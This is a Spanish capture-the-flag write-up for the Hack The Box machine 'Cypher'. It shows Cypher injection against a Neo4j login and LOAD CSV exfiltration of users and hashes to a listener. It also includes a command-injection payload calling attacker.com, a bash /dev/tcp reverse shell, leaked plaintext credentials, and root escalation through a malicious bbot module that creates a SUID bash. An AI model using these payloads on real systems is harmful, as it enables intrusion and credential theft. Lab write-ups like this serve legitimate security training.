
# Cypher

<figure><img src="/files/jwUOQ8BVfpXVCtdWi9Wr" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Cypher`
* **IP:** `10.10.11.57`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `01-06-2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.57 cypher.htb" | sudo tee -a /etc/hosts
```

### Acceso Web

Accedemos a `http://cypher.htb` y observamos que parece ser una web que ofrece una solución de gestión de la superficie de ataque con IA:

<figure><img src="/files/n32mfpFWMUQ4q1xqGciW" alt=""><figcaption></figcaption></figure>

Al darle a Free Demo nos redirige al login:

<figure><img src="/files/WmQdbSY7ftPiCIuFeGua" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Escaneo de Puertos</mark>

```bash
sudo nmap -v -sV -T5 10.10.11.57
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

***

## <mark style="color:purple;">Enumeración Web</mark>

### Fuzzing de Directorios

```bash
gobuster dir -u http://cypher.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cypher.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 4986]
/api                  (Status: 307) [Size: 0] [--> /api/docs]
/demo                 (Status: 307) [Size: 0] [--> /login]
/index                (Status: 200) [Size: 4562]
/index.html           (Status: 200) [Size: 4562]
/login                (Status: 200) [Size: 3671]
/testing              (Status: 301) [Size: 178] [--> http://cypher.htb/testing/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

**Directorios interesantes encontrados:**

* `/api` (307)
* `/demo` (307)
* `/testing` (301) - Directorio curioso

### Directorio Testing

Accedemos a testing y encontramos un `snapshot.jar`:

<figure><img src="/files/bziuKltUoEsknyJP5u7l" alt=""><figcaption></figcaption></figure>

Nos lo descargamos y lo extraemos para analizarlo.

```bash
cd custom-apoc-extension-1.0-SNAPSHOT 

tree .                 
.
├── com
│   └── cypher
│       └── neo4j
│           └── apoc
│               ├── CustomFunctions$StringOutput.class
│               ├── CustomFunctions.class
│               ├── HelloWorldProcedure$HelloWorldOutput.class
│               └── HelloWorldProcedure.class
└── META-INF
    ├── MANIFEST.MF
    └── maven
        └── com.cypher.neo4j
            └── custom-apoc-extension
                ├── pom.properties
                └── pom.xml

9 directories, 7 files
```

Lo decompilamos para ver el código. Podemos utilizar la siguiente web:

{% embed url="<https://www.decompiler.com>" %}

<figure><img src="/files/h5eHmNx48VVb1L3v70ch" alt=""><figcaption></figcaption></figure>

Vemos 2 archivos principales, un `HelloWorld` que no contiene nada relevante y `CustomFunctions` que contiene código muy interesante:

```java
public class CustomFunctions {
   @Procedure(
      name = "custom.getUrlStatusCode",
      mode = Mode.READ
   )
   @Description("Returns the HTTP status code for the given URL as a string")
   public Stream<CustomFunctions.StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
      if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
         url = "https://" + url;
      }

      String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
      System.out.println("Command: " + Arrays.toString(command));
      Process process = Runtime.getRuntime().exec(command);
      BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
      BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
      StringBuilder errorOutput = new StringBuilder();

```

Este código confirma un command injection.&#x20;

1. **Normaliza la URL** (añade `https://` si no está presente).
2. Construye un comando **con concatenación de strings**:

```java
String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
```

3. Lo ejecuta con:

```java
Runtime.getRuntime().exec(command);
```

Usar `Runtime.getRuntime().exec(String[])` con entrada del usuario sin sanitizar permite **Command Injection**.

La siguiente línea:

```java
String[] command = new String[]{"/bin/sh", "-c", "curl ... " + url};
```

**pasa toda la entrada del usuario directamente a la shell (`sh -c`)**, lo cual es un patrón clásico de vulnerabilidad si no se escapan ni validan los parámetros.

**✅ Ejemplo de payload malicioso:**

```cypher
CALL custom.getUrlStatusCode("http://example.com; curl http://attacker.com/`whoami`")
```

Este payload ejecutaría:

```bash
/bin/sh -c "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} http://example.com; curl http://attacker.com/`whoami`"
```

Esto hace que se ejecute un segundo `curl` que envía la salida de `whoami` a un servidor controlado por el atacante.

***

## <mark style="color:purple;">Testing web</mark>

Capturamos el request de login con BurpSuite y vemos que los datos se envían como un JSON a través de la api:

```bash
POST /api/auth HTTP/1.1
Host: cypher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 39
Origin: http://cypher.htb
DNT: 1
Connection: keep-alive
Referer: http://cypher.htb/login
Priority: u=0

{"username":"admin","password":"admin"}
```

Probando alguna inyección SQL nos devuelve un error en el front que nos indica la presencia de una base de datos cypher de neo4j:

<figure><img src="/files/gwnGgK5KdtnkNqUgdk4F" alt=""><figcaption></figcaption></figure>

Est confirma una inyección de Cypher (Neo4j) en el backen&#x64;**.** El backend construye las consultas Cypher dinámicamente con los valores que le envíamos, y no está sanitizando correctamente las comillas.

### Captura de login

Al capturar un intento de login con BurpSuite observamos que los datos se envían como JSON, por lo que podríamos probar ahí el Command Injection:

<figure><img src="/files/8edH8Zx9XdrjpaYYx6Ks" alt=""><figcaption></figcaption></figure>

Sabemos por el traceback que el backend construye una query similar a esta:

```cypher
MATCH (u:USER)-[:SECRET]->(h:SHA1) WHERE u.name = '<username>' RETURN h.value AS hash
```

Nuestro objetivo es cerrar correctamente la condición `u.name = '...'`, romper el flujo original, e inyectar nuestro `CALL` a `custom.getUrlStatusCode()` con un payload de RCE.

### Enumerar versión

Usaremos el siguiente payload:

```json
{
  "username": "' OR 1=1 WITH  1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://127.0.0.1/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // ",
  "password": "x"
}
```

<figure><img src="/files/Z9T0yZWogivLvHbnTX0P" alt=""><figcaption></figcaption></figure>

Funciona! Obtenemos la versión de Neo4j y el tipo de Kernel community:

```
127.0.0.1/?version=5.24.1&name=Neo4j Kernel&edition=community
```

### Enumerar los labels

```json
{
  "username": "' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://127.0.0.1/?l='+label as l RETURN 0 as _0 //",
  "password": "x"
}
```

Tenemos el label `USER`:

```
message: Cannot load from URL 'http://127.0.0.1/?l=USER': Redirect limit exceeded ()
```

### Enumerar la propiedad USER

Vamos a cambiar un poco el enfoque. Abriremos un listener de Netcat para recibir los resultados:

```bash
nc -nlvp 4444
```

Y usaremos el siguiente payload:

```json
{"username":"' OR 1=1 WITH 1 as a MATCH (f:USER) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.4:4444/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //","password":"x"}
```

Eso nos devuelve un nombre de usuario: `graphasm`

```bash
nc -nlvp 4444

listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.57] 50642
GET /?name=graphasm HTTP/1.1
User-Agent: NeoLoadCSV_Java/17.0.14+7-Ubuntu-124.04
Host: 10.10.14.4:4444
Accept: text/html, image/gif, image/jpeg, */*; q=0.2
```

### Extracción de hashes

Usaremos el payload definitivo:

```json
{
  "username": "' OR 1=1 WITH 1 as a MATCH (u:USER)-[:SECRET]->(h:SHA1) LOAD CSV FROM 'http://10.10.14.4:4444/?user='+u.name+'&hash='+h.value as l RETURN 0 as _0 //",
  "password": "x"
}
```

Y nos devuelve el hash del usuario:

```bash
nc -nlvp 4444

listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.57] 45448
GET /?user=graphasm&hash=9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1
```

Este hash no se puede crackear fácilmente, por lo que modificaremos el payload para conseguir una reverse shell.

### Reverse Shell

Abrimos un listener de Netcat por el puerto 4444

```bash
nc -nlvp 4444

listening on [any] 4444 ...
```

#### Payload

```json
{
  "username": "' OR 1=1 WITH 1 as x CALL custom.getUrlStatusCode('http://127.0.0.1; bash -c \"bash -i >& /dev/tcp/10.10.14.4/4444 0>&1\"') YIELD statusCode RETURN x //",
  "password": "x"
}
```

#### Recibimos la shell

```bash
nc -nlvp 4444

listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.57] 51352
bash: cannot set terminal process group (1449): Inappropriate ioctl for device
bash: no job control in this shell

neo4j@cypher:/$ whoami
neo4j
```

***

## <mark style="color:purple;">Enumeración interna</mark>

Enumerando el objetivo no podemos acceder directamente a la user flag, ya que pertenece al usuario graphasm, pero en su directorio home encontramos unas credenciales:

```shell-session
neo4j@cypher:/$ cd /home

neo4j@cypher:/home$ ls
graphasm

neo4j@cypher:/home$ cd graphasm 
neo4j@cypher:/home/graphasm$ ls
bbot_preset.yml
user.txt

neo4j@cypher:/home/graphasm$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

neo4j@cypher:/home/graphasm$ cat bbot_preset.yml
cat bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

***

## <mark style="color:purple;">User flag</mark>

Al probar las credenciales encontradas con el usuario `graphasm` por SSH conseguimos acceder!

```shell-session
afsh4ck@kali$ ssh graphasm@10.10.11.57
                
The authenticity of host '10.10.11.57 (10.10.11.57)' can't be established.
ED25519 key fingerprint is SHA256:u2MemzvhD6xY6z0eZp5B2G3vFuG+dPBlRFrZ66gaXZw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.57' (ED25519) to the list of known hosts.
graphasm@10.10.11.57's password: 

Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)
Last login: Sun Jun 1 13:34:51 2025 from 10.10.14.4

graphasm@cypher:~$ whoami                                                                                                                                             
graphasm

graphasm@cypher:~$ id
uid=1000(graphasm) gid=1000(graphasm) groups=1000(graphasm)

graphasm@cypher:~$ ls 
bbot_preset.yml  user.txt

graphasm@cypher:~$ cat user.txt 
7b9e5118acc395843ed098*********
```

Tenemos la user flag!

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

```shell-session
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

Vemos que este usuario graphasm puede ejecutar la herramienta de bbot, una conocida herramienta de OSINT y enumeración.

{% embed url="<https://github.com/blacklanternsecurity/bbot>" %}

Usaremos el `bbot_preset.yml` que tenemos en el directorio home para realizar el escaneo:

```shell-session
graphasm@cypher:~$ cat bbot_preset.yml

targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

Se lo pasaremos a la herramienta de la siguiente manera:

{% embed url="<https://www.blacklanternsecurity.com/bbot/Stable/scanning/presets/>" %}

```shell-session
graphasm@cypher:~$ bbot -p ./bbot_preset.yml 
```

<figure><img src="/files/MzObFb1A6YQou4RsruiS" alt=""><figcaption></figcaption></figure>

En principio no obtenemos información relevante. La herramienta de Bbot permite construir módulos custom en python, con lo que podríamos modificarlo para convertirnos en root:

{% embed url="<https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/>" %}

### Crear exploit.yml

Necesitamos crear este archivo e incluir el nombre del módulo en python que modificaremos.

```shell-session
graphasm@cypher:~$ cd /tmp
graphasm@cypher:~$ nano exploit.yml
```

```yaml
# exploit.yml
home: /tmp/bbot_home
module_dirs:
  - /tmp/bbot/modules

# Configuración básica
dns:
  disable: false

# Habilitar módulo whois
modules:
  - whois

# Configuración del módulo whois
whois:
  api_key: "cualquier_valor_vale_aqui"
```

Debemos crear la ruta `/tmp/bbot/modules` donde crearemos el módulo python modificado.

### Crear whois.py malicioso

Modificaremos el ejemplo que nos da la documentación de Bbot:

{% code title="whois.py" %}

```python
from bbot.modules.base import BaseModule

class whois(BaseModule):
    watched_events = ["DNS_NAME"] # watch for DNS_NAME events
    produced_events = ["WHOIS"] # we produce WHOIS events
    flags = ["passive", "safe"]
    meta = {"description": "Query WhoisXMLAPI for WHOIS data"}
    options = {"api_key": ""} # module config options
    options_desc = {"api_key": "WhoisXMLAPI Key"}
    per_domain_only = True # only run once per domain

    base_url = "https://www.whoisxmlapi.com/whoisserver/WhoisService"

    # one-time setup - runs at the beginning of the scan
    async def setup(self):
        self.api_key = self.config.get("api_key")
        if not self.api_key:
            # soft-fail if no API key is set
            return None, "Must set API key"

    async def handle_event(self, event):
        self.hugesuccess(f"Got {event} (event.data: {event.data})")
        _, domain = self.helpers.split_domain(event.data)
        url = f"{self.base_url}?apiKey={self.api_key}&domainName={domain}&outputFormat=JSON"
        self.hugeinfo(f"Visiting {url}")
        response = await self.helpers.request(url)
        if response is not None:
            await self.emit_event(response.json(), "WHOIS", parent=event)
```

{% endcode %}

Concretamente modificaremos el método `setup()` para conseguir el root, añadiendo las líneas:

```bash
import os # Al principio
os.system("cp /bin/bash /tmp/bash; chmod u+s /tmp/bash") # En setup()
```

Lo que hacemos con esto es que:

* Copiamos el binario `/bin/bash` a /tmp
* Con `chmod u+s /tmp/bash` establecemos el **bit SUID** (Set User ID) en el archivo `/tmp/bash`

{% code title="whois.py" %}

```python
from bbot.modules.base import BaseModule
import os

class whois(BaseModule):
    watched_events = ["DNS_NAME"]  # watch for DNS_NAME events
    produced_events = ["WHOIS"]    # we produce WHOIS events
    flags = ["passive", "safe"]
    meta = {"description": "Query WhoisXMLAPI for WHOIS data"}
    options = {"api_key": ""}      # module config options
    options_desc = {"api_key": "WhoisXMLAPI Key"}
    per_domain_only = True         # only run once per domain

    base_url = "https://www.whoisxmlapi.com/whoisserver/WhoisService"

    # one-time setup - runs at the beginning of the scan
    async def setup(self):
        os.system("cp /bin/bash /tmp/bash; chmod u+s /tmp/bash")
        self.api_key = self.config.get("api_key")
        if not self.api_key:
            # soft-fail if no API key is set
            return None, "Must set API key"

    async def handle_event(self, event):
        self.hugesuccess(f"Got {event} (event.data: {event.data})")
        _, domain = self.helpers.split_domain(event.data)
        url = f"{self.base_url}?apikey={self.api_key}&domainName={domain}&outputFormat=JSON"
        self.hugeinfo(f"Visiting {url}")
        response = await self.helpers.request(url)
        if response is not None:
            await self.entityEvent(response.json(), "WHOIS", parent=event)
```

{% endcode %}

### Ejecutamos el módulo malicioso

```shell-session
graphasm@cypher:/tmp/bbot/modules$ sudo bbot -p /tmp/exploit.yml -m whois
```

<figure><img src="/files/1Kc6Dxjh0uOhSZ0DJqRR" alt=""><figcaption></figcaption></figure>

### Comprobación de root

Accedemos a `/tmp` y observamos que se ha copiado correctamente el binario `bash` y se ejecuta como `root`:

```bash
graphasm@cypher:/tmp/bbot/modules$ cd /tmp

graphasm@cypher:/tmp/bbot/modules$ ls -la
total 2448
drwxrwxrwt 19 root     root       12288 Jun  1 14:22 .
drwxr-xr-x 22 root     root        4096 Feb 17 16:48 ..
-rwsr-xr-x  1 root     root     1446024 Jun  1 14:22 bash # Binario root
drwxrwxr-x  3 graphasm graphasm    4096 Jun  1 14:18 bbot
```

Lo ejecutamos con `./bash -p` y nos convertimos en root:

```bash
graphasm@cypher:/tmp$ ./bash -p
bash-5.2# whoami
root
bash-5.2# id
uid=1000(graphasm) gid=1000(graphasm) euid=0(root) groups=1000(graphasm)
```

## <mark style="color:purple;">Root flag</mark>

```bash
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
b7871832e006229aadda5b22********
```
